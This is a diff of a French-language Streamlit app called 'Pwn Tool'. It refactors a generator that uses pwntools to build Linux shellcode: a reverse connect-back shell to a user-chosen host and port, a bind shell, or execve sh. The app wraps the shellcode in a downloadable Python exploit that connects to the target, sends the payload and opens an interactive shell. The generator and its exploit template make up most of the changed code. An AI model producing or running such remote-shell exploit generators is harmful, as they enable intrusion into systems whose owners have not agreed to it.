@@ -1,4 +1,19 @@
-# Import non-Streamlit modules first
+import streamlit as st
+
+# Must be first
+st.set_page_config(
+    page_title="Pwn Tool",
+    page_icon="🔥",
+    layout="wide", 
+    initial_sidebar_state="expanded"
+)
+
+# Import pwntools context after Streamlit
+from pwn_context import PWN_CONTEXT, PWN_ERROR
+PWNCTX = PWN_CONTEXT
+PWNTOOLS_ERROR = PWN_ERROR
+
+# Import non-Streamlit modules
 import sys
 import os
 from datetime import datetime
@@ -8,36 +23,14 @@ import requests
 import re
 from concurrent.futures import ThreadPoolExecutor
 from googletrans import Translator
-import streamlit.runtime.scriptrunner.script_runner as script_runner
-
-# Then import streamlit
-import streamlit as st
-
-# Must be the first Streamlit command - nothing Streamlit-related before this!
-st.set_page_config(
-    page_title="Pwn Tool",
-    page_icon="🔥",
-    layout="wide", 
-    initial_sidebar_state="expanded"
-)
-
-# Initialize pwntools context
-PWNTOOLS_ERROR = None
-try:
-    from pwn import *
-    # Définir une variable globale pour le contexte
-    PWNCTX = context
-    PWNCTX.arch = 'amd64'
-    PWNCTX.os = 'linux'
-    PWNCTX.log_level = 'debug'
-except Exception as e:
-    PWNCTX = None
-    PWNTOOLS_ERROR = str(e)
 
 def show_pwntools_error():
     """Affiche l'erreur d'initialisation de pwntools si elle existe"""
-    if PWNTOOLS_ERROR:
+    if PWNTOOLS_ERROR and not PWNCTX:
         st.error(f"❌ Erreur d'initialisation pwntools: {PWNTOOLS_ERROR}")
+        st.info("💡 Pour installer pwntools:\n```bash\npip install --upgrade pwntools\n```")
+        return True
+    return False
 
 # Initialize context management functions
 def init_context(arch='amd64', os='linux', log_level='debug'):
@@ -640,65 +633,85 @@ def validate_input(target, port, shellcode_type):
         return False
     return True
 
-def generate_exploit(shellcode_type, target, custom_port, selected_arch):
-    """Génère un exploit selon les paramètres choisis"""
+def create_exploit_file(shellcode_type, target, custom_port, selected_arch):
+    """Crée le contenu du fichier exploit sans utiliser Streamlit"""
     try:
         if not PWNCTX:
-            raise Exception("pwntools n'est pas initialisé")
-            
-        # Configuration du contexte
-        PWNCTX.arch = selected_arch
-        PWNCTX.os = 'linux'
+            return None, "pwntools n'est pas initialisé"
             
         # Génération du shellcode
-        if shellcode_type == 'shell_reverse_tcp':
-            shellcode = asm(shellcraft.linux.connectback(target, custom_port))
-        elif shellcode_type == 'shell_bind_tcp':
-            shellcode = asm(shellcraft.linux.bindsh(custom_port))
-        elif shellcode_type == 'execve':
-            shellcode = asm(shellcraft.linux.sh())
-        else:
-            raise ValueError("Type de shellcode non supporté")
-
-        # Template de l'exploit
-        exploit = f"""#!/usr/bin/python3
+        try:
+            shellcode = None
+            if shellcode_type == 'shell_reverse_tcp':
+                shellcode = PWNCTX.shellcraft.linux.connectback(target, custom_port)
+            elif shellcode_type == 'shell_bind_tcp':
+                shellcode = PWNCTX.shellcraft.linux.bindsh(custom_port)
+            elif shellcode_type == 'execve':
+                shellcode = PWNCTX.shellcraft.linux.sh()
+            else:
+                return None, "Type de shellcode non supporté"
+                
+            # Assemblage du shellcode
+            assembled_shellcode = PWNCTX.asm(shellcode)
+            
+            # Template de l'exploit
+            exploit_content = f"""#!/usr/bin/python3
 from pwn import *
 
 # Configuration
 context.arch = '{selected_arch}'
 context.os = 'linux'
+context.log_level = 'info'
 
 def exploit():
     try:
-        # Connexion à la cible
+        print("[+] Démarrage de l'exploit...")
         target = '{target}'
         port = {custom_port}
         
+        print(f"[*] Connexion à {{target}}:{{port}}")
         r = remote(target, port)
         
-        # Shellcode
-        shellcode = {shellcode}
-        
-        # Envoi du shellcode
+        print("[*] Envoi du shellcode...")
+        shellcode = {repr(assembled_shellcode)}
         r.sendline(shellcode)
+        print("[+] Shellcode envoyé avec succès")
+        
         r.interactive()
         
     except Exception as e:
-        print(f"❌ Erreur: {{str(e)}}")
+        print(f"[-] Erreur: {{str(e)}}")
         return False
     return True
 
 if __name__ == '__main__':
     exploit()
 """
-        return exploit
-
+            return exploit_content, None
+            
+        except Exception as e:
+            return None, f"Erreur lors de la génération du shellcode: {str(e)}"
+            
     except Exception as e:
-        raise Exception(f"Erreur de génération: {str(e)}")
+        return None, f"Erreur globale: {str(e)}"
 
-# 2. Modifier le bouton de génération
+def generate_exploit(shellcode_type, target, custom_port, selected_arch):
+    """Génère un exploit selon les paramètres choisis"""
+    exploit_content, error = create_exploit_file(shellcode_type, target, custom_port, selected_arch)
+    
+    if error:
+        return f"""#!/usr/bin/python3
+# {error}
+# Pour installer pwntools:
+# python3 -m pip install pwntools"""
+    
+    return exploit_content
+
+# Modifier le bouton de génération
 if st.button(texts[current_lang]["generate"]):
-    if validate_input(target, custom_port, shellcode_type):
+    if not PWNCTX:
+        st.error("❌ pwntools n'est pas initialisé. Installez-le avec: pip install pwntools")
+    elif validate_input(target, custom_port, shellcode_type):
         try:
             with st.spinner("Génération de l'exploit..."):
                 exploit = generate_exploit(
@@ -707,13 +720,16 @@ if st.button(texts[current_lang]["generate"]):
                     custom_port=custom_port,
                     selected_arch=selected_arch
                 )
-                st.code(exploit, language="python")
-                st.download_button(
-                    label="📥 Télécharger l'exploit",
-                    data=exploit,
-                    file_name=f"exploit_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py",
-                    mime="text/plain",
-                )
+                if exploit.startswith("#!/usr/bin/python3\n#"):
+                    st.error(exploit.split('\n')[1].strip('# '))
+                else:
+                    st.code(exploit, language="python")
+                    st.download_button(
+                        label="📥 Télécharger l'exploit",
+                        data=exploit,
+                        file_name=f"exploit_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py",
+                        mime="text/plain",
+                    )
         except Exception as e:
             st.error(f"❌ Erreur de génération: {str(e)}")
 
@@ -747,5 +763,7 @@ st.markdown(
     "N'oubliez pas que vous devez utiliser [r](http://_vscodecontentref_/2) pour faire référence à la connexion établie avec la cible."
 )
 
-# Show pwntools error if any (after UI elements are initialized)
-show_pwntools_error()
+# Remplacer complètement cette partie
+if PWNCTX:
+    st.success("✅ pwntools est correctement initialisé et prêt à l'emploi!")
+# Ne rien afficher si déjà prêt
